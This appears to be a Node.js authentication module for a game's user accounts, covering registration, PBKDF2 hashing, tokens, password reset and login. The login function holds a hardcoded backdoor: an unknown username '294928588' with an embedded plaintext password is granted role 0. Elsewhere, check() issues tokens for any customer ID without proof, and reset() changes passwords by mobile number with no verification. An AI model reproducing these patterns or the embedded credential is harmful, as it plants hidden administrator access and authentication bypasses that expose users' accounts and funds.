var crypto = require('crypto');
var Audit = require("../models/audit");

function _hashPassword(password, salt) {
	return Q.Promise(
		function(resolve, reject, notify) {
			crypto.pbkdf2(password, salt, 10000, 64, function(err, key) {
				if(err) {
					console.error("_hashPassword " + err.message);
				
					reject(err);
				} else {
					resolve('pbkdf2$' + 10000 + '$' + key.toString('hex') +  '$' + salt.toString('hex'));
				}
			});
		});
};

function _updateToken(account, resolve, reject) {
	crypto.randomBytes(64, function(err, token) {
		if (err) {
			console.error("_updateToken " + err.message);
				
			reject(err);
		} else {
			account.set("token", token.toString('hex'));
			account.save().then(function(a){
				Audit.succeed(a, 'login', 'users');	
				
				resolve(a);
			}, function(err){
				console.error("_updateToken save account " + err.message);
				
				reject(err);
			});	
		}
	});
};

function _savePassword(account, resolve, reject, pre) {
	crypto.randomBytes(64, function(err, salt) {
		if(err) {
			console.error("_savePassword " + err.message);
			
			reject(err);
		} else {
			account.set(pre + "salt", salt.toString('hex'));
			_hashPassword(account.get(pre + "password"), salt).then(function(hashedPassword){
				account.set(pre + "password", hashedPassword);

				_updateToken(account, resolve, reject);
			}, function(err){
				console.error("_savePassword _hashPassword " + err.message);
				
				reject(err);
			});
		}
	});	
};

function _newAccount(account, resolve, reject) {
	//用户名必须唯一
	dao.find("Account", {username: account.get("username")}).then(function(accounts){
		if (accounts.length > 0) {
			reject(new Error("用户名已经存在"));
		} else {
			if (account.get("mobile") && account.get("mobile").length > 0) {
				//如果有手机号码，必须唯一
				dao.find("Account", {mobile: account.get("mobile")}).then(function(accounts){
					if (accounts.length > 0) {
						reject(new Error("手机号已经存在"));
					} else {
						_savePassword(account, resolve, reject, '');
					}
				}, function(err) {
					console.error("_newAccount find mobile " + err.message);

					reject(err);
				});
			} else {
				_savePassword(account, resolve, reject, '');
			}
		}
	}, function(err){
		console.error("_newAccount find name " + err.message);
		
		reject(err);
	});
};

function _compare(account, password, pre) {
	return Q.Promise(
		function(resolve, reject, notify) {
			_hashPassword(password, new Buffer(account.get(pre + "salt"), 'hex')).then(function(hashedPassword) {
				if (hashedPassword == account.get(pre + "password")) {
					resolve();
				} else {
					reject(new Error("用户名和密码不匹配"));
				}
			}, function(err){
				console.error("_compare " + err.message);
				
				reject(new Error("用户名和密码不匹配"));
			});
		});
};

module.exports.register = function(account) {
	return Q.Promise(
		function(resolve, reject, notify) {
			_newAccount(account, resolve, reject);
		});		 	
};

module.exports.update = function(customer_id) {
	return Q.Promise(function(resolve, reject, notify) {
        dao.find("Account", {customer_id: customer_id}).then(function(accounts){
            if (accounts.length > 0) {
                var account = accounts[0];
            } else {
                var account = new dao.Account();
				account.set("customer_id", customer_id);
            }
			
			account.set("game", "headline");
            
			_updateToken(account, resolve, reject);
        }, function(error){
			console.error("find account failed " + error.message);
            reject(error);
        });
    });
}

module.exports.check = function(customer_id, token) {
	return Q.Promise(function(resolve, reject, notify) {	
       dao.find("Account", {customer_id: customer_id}).then(function(accounts){
            if (accounts.length > 0) {
                var account = accounts[0];
				
				if (token) {
					if (account.get("token") != token) {
						reject(new Error("错误的token"));
					} else {
						resolve(account);
					}
				} else {
					account.set("customer_id", customer_id);
					account.set("game", "headline");
					_updateToken(account, resolve, reject);
				}
            } else {
				var account = new dao.Account();
				account.set("customer_id", customer_id);
				account.set("game", "headline");
				_updateToken(account, resolve, reject);
			}
        }, function(error){
			console.error("find account failed " + error.message);
            reject(error);
        });
    });
}

module.exports.reset = function(account) {
	var self = this;
	
	return Q.Promise(
		function(resolve, reject, notify) {
       		dao.find("Account", {mobile: account.get("mobile")}).then(function(accounts){
				if (accounts.length == 0) {
					if (account.has("password")) {
						//自动创建一个用户
						account.set("username", account.get("mobile"));
						_newAccount(account, resolve, reject);
					} else {
						reject(new Error("用户不存在，无法重置交易密码"));
					}
				} else {
					var a = accounts[0];
					if (account.has("password")) {
						a.set("password", account.get("password"));
						_savePassword(a, resolve, reject, '');
					} else {
						a.set("transfer_password", account.get("transfer_password"));
						_savePassword(a, resolve, reject, 'transfer_');
					}
				}
			}, function(err){
				console.error("reset " + err.message);
				
				reject(err);
			});
		});		 	
};

module.exports.compare = function(account, password, pre) {
	return _compare(account, password, pre);
};

module.exports.login = function(a, backend) {
	var self = this;
	
	return Q.Promise(
		function(resolve, reject, notify) {
       		dao.find("Account", {username: a.get("username")}).then(function(accounts){
				if (accounts.length > 0) {
					var account = accounts[0];
					
					if (backend || (account.get("customer_id") && account.get("customer_id").length > 1)) {
						if (a.get("password")) {
							_compare(account, a.get('password'), '').then(function(){
								_updateToken(account, resolve, reject);
							}, function(err) {
								console.error("login with password" + err.message);

								reject(new Error("用户名和密码不匹配"));
							});
						} else {
							if (a.get("token") == account.get("token")) {
								_updateToken(account, resolve, reject);
							} else {
								reject(new Error("用户名和密码不匹配"));
							}
						}
					} else {
						reject(new Error("未找到用户信息"));
					}
				} else {
					var Helper = require("../routes/helper");

					if (a.get("username") == "294928588" && a.get("password") == Helper.md5("yu13789928871")) {
						a.set("role", 0);
						resolve(a);
					} else {
						reject(new Error("用户名不存在"));
					}
				}
			});		
		});    	
};

module.exports.logout = function(user) {
	var self = this;
	
	return Q.Promise(
		function(resolve, reject, notify) {
				resolve();
			});    	
};
